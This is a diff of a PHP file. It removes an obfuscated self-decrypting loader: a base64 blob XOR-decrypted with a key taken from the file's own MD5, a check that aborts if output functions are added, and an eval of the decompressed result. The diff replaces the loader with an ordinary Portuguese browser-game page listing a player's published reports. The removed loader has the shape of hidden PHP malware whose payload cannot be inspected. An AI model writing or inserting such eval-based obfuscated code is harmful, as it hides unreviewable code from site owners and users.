@@ -1,24 +1,98 @@
 <?php
-$rfjpnrol="14782bcb4fefdd53e0be785c0c73974b";
-$auoteoooh="550d025c055301560553505e5c5705035106535d0709065b090652000c51575a";
-$ssgwgqa="HOOIPPxfeQMl6C7IByOz5BczhFyXdCS2Hyd3K8VECjSj9PMUMK2DobcEsqSoLwl6r5nYGi9hR+uUGsmkqeEHYfYcDsw38oDfbetGp+xTaFTx2H/H2eLuJcvx+aW8hkoB53tcD/9qSN0pR6WuRNNA3YOK0D5nmSOcSf4oNbmOGUdWHANnZSuy0KvuudwLM2VompJAIM3srtmyuPjuqCeV1KFZLfUP3+Yhd/q2nkm+KM589AIo5O/PlYBXwYvMsU4Td0/8lPKR7dMMe4Qw+/OU3sT9fh0XtFF4/8XcFb3HhMnYDf+UHCHyHfyM+ZAe56Dv+uiRonSkZdvTIlD1aHwvt9hiPIXT1aYdDtSTnLpMmZcBz7X7fxSdLFnpxwsz9EmhpfQC7mVhOptnnJ0MSkURTHAMoS9G60rqq7g14Nh4cv9G+Po5ypT4k8HirocsgkiH0SGuL204NVlZaxuXQSgRiP1bZBTN359NcV3f9CE2U6p3Ob40F207jEyBS8GReD+8+Lyi7IRWMDkRlt92QwoiJWHExlIQNzEU/RxMHxpiZ40MFquvlYWmejq9t7QLNQIQJtPT0DqXMqFpNIfzfhBQEFTJGdI/p0Q2OCLhoBBz0zTcqP1eYUFLSMmm2Z9f0T2gzV+GgueC4VT4sw5vdQB4nybDCBh6l5vSbHF95wfTTL2M4bn/2QP6de5T/v0XPiXXJvj1n70EWGNXbwf50UU98aOzBMGD6mBcebR6knOv0cewBYsdNCu3b7efP/o80QOOYJFJrNxBkTlMSOBJpOGHLPd5S7d3JjSiXwEsl4wKk5y0SsQSiIY2H13w/yJvmsyqh+5KS5HqI1LkmRWWxpM0MtjeH0y9YGmpocDHJurb1f5MlgeExL0VQhrx9hBLAjX7GNbuN6VYenFwymPVyHoZkxK9ax7tmdXqa1hjKDAXQZDYM+OkAJsHAiaTtaxrolK5BCs+UYkkg3aUL1DJyv6vyngnVM7uwGXph9BMuoVxrBp4EK/Vd2lFhWBP1gyHZPpUy6O+XayIKA9kzP4+xgKnvrRHKi+QQl200hw5UQ+gWtKuhqrZzpasRT5EL8/BQLNIzIiUQV+vrb6ukNGHUCngFdFNOKu/2t4nH8Vg9/9GP1CMKlJoEVjU4IvBxR5Jz1keiNPVR8F6ZykSolUU9EYEXUcOxfS27B6VbyySdvGF5Oddkd6GhGSfdPsF3GjUgE45vIdiucmOk7QYJp4xc5DrxBBpSRq55CnuTPaKWOtFSLgn3WUnFLrWC3A30YnmmraTme7NkZ8fwv2XwP76X+gmmL88x8pe747Q7i5k6TgddhHCChIVKmDNXqEP6EMEmJbyw1W/u7NKR+aq7EytWqXq2JbzBJYxzl26P3p2xMbL3PPF73RAQk9NIqYFbt483z6KnvIfMXTl5JVHrvA9mk1ue+DQT2MPIxeTgsOCV03RzmKF1IIYTYpULgJl6Hn/y868J1Oc8ofanQWDxWw74pdOu9/qFdMMrVmIRhZ5sqBNXOkC7S9ItYX5ze9chRMcN9FU+h688TPOlC29HYu+uqm2Wueqh+9sA0blKk/AHXgFQBZwXF2Qcjwy5Vqf3j5FxfhdqOzSlo3NUJa0iu6v7sDMVVaF0nDvq0pLUdhd5rfEZ7+xaTN0U2lPN1Y3JS1rWrVo2h03c5U+5doY7gn0w91VDk+Dev53fB82icuW8eNdJJ2Q/KmoVZXrnx/MVr4HclaqMQY143SkpdbO/vvIwASJ5bsT2KqwDyobJ7fByvpqykfLsjgW89+vy/UV+HgrBb3Q0O7fwP6cGczMfPonObXHWDoBYkuIbigZZjSOTZiQHNfYwzs=";
-$lxdjykbxd=file_get_contents(__FILE__);
-$gqyhwfvjh=str_replace($ssgwgqa,"",$lxdjykbxd);
-if(strpos($gqyhwfvjh,"ec"."ho")!==false||strpos($gqyhwfvjh,"pr"."int")!==false||strpos($gqyhwfvjh,"var_"."dump")!==false||strpos($gqyhwfvjh,"file_put_"."contents")!==false||strpos($gqyhwfvjh,"fw"."rite")!==false){die();}
-$mrxnez=str_replace(array($rfjpnrol,$auoteoooh),array("SP_aeec8d1e","KP_7d362cf5"),$lxdjykbxd);
-$gncviuz=md5($mrxnez);
-$vqrogoi=hex2bin($auoteoooh);
-$tkkrhbyr="";
-$pemtcd=strlen($gncviuz);
-for($lntdvka=0;$lntdvka<$pemtcd;$lntdvka++){
-$tkkrhbyr.=chr(ord($vqrogoi[$lntdvka])^ord($gncviuz[$lntdvka]));
-}
-$gpfxoawdu=base64_decode($ssgwgqa);
-$ewcuzdtpr=strlen($gpfxoawdu);
-$xjlzni="";
-$fmygwrg=strlen($tkkrhbyr);
-for($lntdvka=0;$lntdvka<$ewcuzdtpr;$lntdvka++){
-$xjlzni.=$gpfxoawdu[$lntdvka]^$tkkrhbyr[$lntdvka%$fmygwrg];
-}
-$suqjdfgwc="gzun"."compress";
-eval('?>' . $suqjdfgwc($xjlzni) . '<?php ');
+/**
+ * Public Reports Management View
+ * Lists all published reports by the user with management options
+ */
+?>
+
+<h2><?= __('report.public_reports', 'Relatórios públicos') ?></h2>
+
+<p><?= __('report.desc', 'Aqui pode gerir os relatórios publicados e encaminhar as URLs a outros jogadores. Os relatórios publicados podem ser visualizados por qualquer pessoa que conheça a URL.') ?></p>
+
+<?php if (empty($published_reports)): ?>
+    <p><?= __('report.no_reports', 'Não tem relatórios publicados.') ?></p>
+<?php else: ?>
+    <form method="POST" action="game.php?village=<?= $village['id'] ?>&screen=report&mode=public&action=delete_multiple">
+        <input type="hidden" name="hkey" value="<?= $hkey ?>">
+
+        <table class="vis" width="100%">
+            <tr>
+                <th width="20">
+                    <input type="checkbox" onclick="selectAll(this)">
+                </th>
+                <th><?= __('report.published', 'Publicado') ?></th>
+                <th><?= __('report.subject', 'Assunto') ?></th>
+                <th><?= __('report.received', 'Recebida') ?></th>
+                <th><?= __('report.visits', 'Convites') ?></th>
+                <th><?= __('report.action', 'Ação') ?></th>
+            </tr>
+
+            <?php foreach ($published_reports as $pr): ?>
+                <tr>
+                    <td>
+                        <input type="checkbox" name="id_<?= $pr['id'] ?>" value="1">
+                    </td>
+                    <td>
+                        <?= date('d.m.', $pr['published_at']) ?><br>
+                        <?= date('H:i:s', $pr['published_at']) ?>
+                    </td>
+                    <td>
+                        <a href="/public_report.php?hash=<?= $pr['hash'] ?>" target="_blank">
+                            <?= htmlspecialchars($pr['title']) ?>
+                        </a>
+                    </td>
+                    <td>
+                        <?= date('d.m.', $pr['time']) ?><br>
+                        <?= date('H:i:s', $pr['time']) ?>
+                    </td>
+                    <td><?= $pr['view_count'] ?></td>
+                    <td>
+                        <a
+                            href="game.php?village=<?= $village['id'] ?>&screen=report&mode=publish&report_id=<?= $pr['report_id'] ?>">
+                            <?= __('report.edit_permissions', 'Editar permissões') ?>
+                        </a>
+                        |
+                        <a href="game.php?village=<?= $village['id'] ?>&screen=report&mode=public&action=delete&id=<?= $pr['id'] ?>"
+                            onclick="return confirm('<?= __('report.confirm_delete_single', 'Tem certeza que deseja apagar este relatório público?') ?>')">
+                            <?= __('report.delete', 'Apagar') ?>
+                        </a>
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="6" style="padding-left: 30px; font-size: 11px;">
+                        <b><?= __('report.bbcode', 'BB-Code:') ?></b>
+                        <input type="text" value="[report]<?= $pr['hash'] ?>[/report]" readonly onclick="this.select()"
+                            style="width: 300px;">
+                        &nbsp;
+                        <b><?= __('report.link', 'Link:') ?></b>
+                        <input type="text" value="<?= $_SERVER['HTTP_HOST'] ?>/public_report/<?= $pr['hash'] ?>" readonly
+                            onclick="this.select()" style="width: 400px;">
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+
+            <tr>
+                <td colspan="6">
+                    <input type="checkbox" id="select_all_bottom" onclick="selectAll(this)">
+                    <label for="select_all_bottom"><?= __('report.select_all', 'Selecionar tudo') ?></label>
+                    &nbsp;&nbsp;
+                    <button class="btn btn-default" type="button" onclick="window.location.reload()"><?= __('report.forward', 'Reencaminhar') ?></button>
+                    &nbsp;
+                    <button class="btn btn-default" type="submit" name="delete_selected"
+                        onclick="return confirm('<?= __('report.confirm_delete_multiple', 'Tem certeza que deseja apagar os relatórios selecionados?') ?>')">
+                        <?= __('report.delete', 'Apagar') ?>
+                    </button>
+                </td>
+            </tr>
+        </table>
+    </form>
+<?php endif; ?>
+
+<script>
+    function selectAll(checkbox) {
+        var checkboxes = document.querySelectorAll('input[type="checkbox"][name^="id_"]');
+        checkboxes.forEach(function (cb) {
+            cb.checked = checkbox.checked;
+        });
+    }
+</script>
